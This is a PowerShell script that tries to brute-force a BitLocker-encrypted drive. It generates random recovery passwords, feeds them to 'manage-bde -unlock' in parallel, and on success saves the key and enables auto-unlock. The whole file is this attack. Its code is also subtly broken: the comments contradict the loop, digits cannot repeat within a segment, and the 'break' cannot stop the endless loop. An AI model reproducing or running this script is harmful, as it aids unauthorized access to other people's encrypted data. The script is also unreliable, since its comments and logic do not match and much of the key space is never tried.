#Requires -Version 7.0

param (
    [Parameter(Mandatory=$true)]
    [string]$driveLetter,
    [Parameter(Mandatory=$true)]
    [string]$saveLocation,
    [Parameter(Mandatory=$true)]
    [int]$coreCount
)

# Function to generate a single BitLocker recovery key
function GenerateBitLockerKey {
    # Initialize an empty array to store the key segments
    $keySegments = @()

    # Loop to generate 6 segments of 8 digits each
    for ($i = 0; $i -lt 8; $i++) {
        # Generate a random 8-digit number
        $segment = -join ((0..9) | Get-Random -Count 6)
        
        # Add the segment to the key segments array
        $keySegments += $segment
    }

    # Combine the segments into a single string separated by hyphens
    $mockKey = $keySegments -join '-'
    return $mockKey
}

while ($true) {
    $bitKeys = @()
    for ($i = 0; $i -lt 10000; $i++) {
        $bitKeys += GenerateBitLockerKey
    }
    $bitKeys | ForEach-Object -Parallel {
        try {
            $recoveryKey = $_
            $process = Start-Process -FilePath "manage-bde" -ArgumentList "-unlock $using:driveLetter -RecoveryPassword $recoveryKey" -WindowStyle Hidden -PassThru -Wait
            # Check the exit code of the process
            if ($process.ExitCode -eq 0) {
                Write-Host "$recoveryKey SUCCESS" -ForegroundColor Green
                $recoveryKey | Out-File -FilePath "$using:saveLocation\successful-key.txt" -Append
                Start-Process -FilePath "manage-bde" -ArgumentList "-autounlock -enable $using:driveLetter" -WindowStyle Hidden
                break
            } else {
                throw "Unlock failed with exit code $($process.ExitCode)"
            }
        }
        catch {
            Write-Host "$recoveryKey FAILED" -ForegroundColor Red
        }
    } -ThrottleLimit $coreCount
}
Read-Host
